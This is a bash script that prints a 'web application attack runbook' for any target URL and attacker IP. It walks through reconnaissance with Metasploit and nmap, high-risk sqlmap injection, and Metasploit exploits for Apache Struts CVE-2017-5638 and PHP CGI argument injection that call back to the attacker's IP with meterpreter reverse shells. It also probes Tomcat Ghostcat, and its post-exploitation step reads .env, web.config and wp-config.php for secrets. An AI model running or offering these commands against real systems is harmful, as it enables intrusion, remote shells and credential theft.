#!/usr/bin/env bash
# ==============================================================================
# WEB APPLICATION ATTACK RUNBOOK — Full web compromise workflow
# Usage: bash web-attack.sh <TARGET_URL> <ATTACKER_IP>
# ==============================================================================
TARGET="${1:-}"
ATTACKER_IP="${2:-}"

[[ -z "$TARGET" ]] && { echo "Usage: bash web-attack.sh <TARGET_URL> <ATTACKER_IP>"; echo "Example: bash web-attack.sh http://10.0.0.100:8080 192.168.1.100"; exit 1; }

echo ""
echo "=== WEB APPLICATION ATTACK RUNBOOK ==="
echo "  Target: $TARGET | Attacker: $ATTACKER_IP"
echo ""

# ── PHASE 1: Recon ────────────────────────────────────────────────────────────
echo -e "--- ${BLUE}PHASE 1: Web Reconnaissance${NC} ---"
echo ""
echo "  # HTTP Version + Options:"
echo "  use auxiliary/scanner/http/http_version"
echo "  set RHOSTS \$(echo $TARGET | awk -F/ '{print \$3}' | cut -d: -f1)"
echo "  set RPORT \$(echo $TARGET | awk -F/ '{print \$3}' | cut -d: -f2 || echo 80)"
echo "  run"
echo ""
echo "  # Directory Brute Force:"
echo "  use auxiliary/scanner/http/dir_scanner"
echo "  set RHOSTS <HOST>"
echo "  set DICTIONARY /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
echo "  run"
echo ""
echo "  # WAF Detection:"
echo "  nmap --script http-waf-detect -p 80,443 <HOST>"
echo ""

# ── PHASE 2: Vulnerability Identification ──────────────────────────────────────
echo -e "--- ${YELLOW}PHASE 2: Vuln Identification${NC} ---"
echo ""
echo "  # SQL Injection:"
echo "  sqlmap -u '${TARGET}/page.php?id=1' --batch --level=3 --risk=3"
echo "  # or in msfconsole:"
echo "  use auxiliary/scanner/http/sqlmap"
echo "  set URL $TARGET"
echo "  run"
echo ""
echo "  # File Inclusion:"
echo "  use auxiliary/scanner/http/verb_auth_bypass"
echo "  set RHOSTS <HOST>"
echo "  run"
echo ""
echo "  # Apache Struts (CVE-2017-5638):"
echo "  use exploit/multi/http/struts2_content_type_ognl"
echo "  set RHOSTS <HOST>"
echo "  set TARGETURI /struts2-showcase/"
echo "  set PAYLOAD linux/x64/meterpreter/reverse_tcp"
echo "  set LHOST $ATTACKER_IP"
echo "  exploit"
echo ""
echo "  # Tomcat Ghostcat (CVE-2020-1938):"
echo "  use auxiliary/admin/http/tomcat_ghostcat"
echo "  set RHOSTS <HOST>"
echo "  run"
echo ""

# ── PHASE 3: Exploitation ──────────────────────────────────────────────────────
echo -e "--- ${RED}PHASE 3: Exploitation${NC} ---"
echo ""
echo "  # PHP CGI Injection:"
echo "  use exploit/multi/http/php_cgi_arg_injection"
echo "  set RHOSTS <HOST>"
echo "  set TARGETURI /"
echo "  set PAYLOAD linux/x64/meterpreter/reverse_tcp"
echo "  set LHOST $ATTACKER_IP"
echo "  exploit"
echo ""
echo "  # WordPress (known plugin vuln):"
echo "  wpscan --url $TARGET --enumerate p,t,u"
echo ""

# ── PHASE 4: Post-Exploitation ──────────────────────────────────────────────────
echo -e "--- ${GREEN}PHASE 4: Post-Exploitation${NC} ---"
echo ""
echo "  # Once shell obtained:"
echo "  run post/multi/recon/local_exploit_suggester"
echo "  cat web.config 2>/dev/null; cat .env 2>/dev/null; cat wp-config.php 2>/dev/null"
echo ""

echo "=== RUNBOOK COMPLETE ==="